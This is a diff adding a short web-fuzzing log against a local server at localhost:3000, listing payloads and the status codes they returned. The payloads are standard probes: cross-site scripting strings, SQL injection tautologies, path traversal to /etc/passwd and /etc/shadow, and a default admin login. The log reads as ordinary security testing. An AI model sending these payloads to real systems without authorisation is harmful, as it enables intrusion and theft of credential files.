@@ -1,0 +1,40 @@
+Fuzzing URL: http://localhost:3000
+
+Date: Sat, 07 Dec 2024 12:14:02 EET
+
+Payload: /admin
+Status Code: 200
+
+Payload: /robots.txt
+Status Code: 200
+
+Payload: /<script>alert(1)</script>
+Status Code: 200
+
+Payload: /?id=1' OR '1'='1
+Status Code: 400
+
+Payload: /<img src=x onerror=alert(1)>
+Status Code: 200
+
+Payload: /?id=1' OR 1=1--
+Status Code: 400
+
+Payload: /../../../etc/passwd
+Status Code: 200
+
+Payload: /../../../../../../etc/shadow
+Status Code: 200
+
+Payload: /%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+Status Code: 400
+
+Payload: /?q=<svg/onload=alert(1)>
+Status Code: 200
+
+Payload: /login?user=admin&pass=admin
+Status Code: 200
+
+Payload: /?search=<iframe src="javascript:alert(1)"></iframe>
+Status Code: 400
+
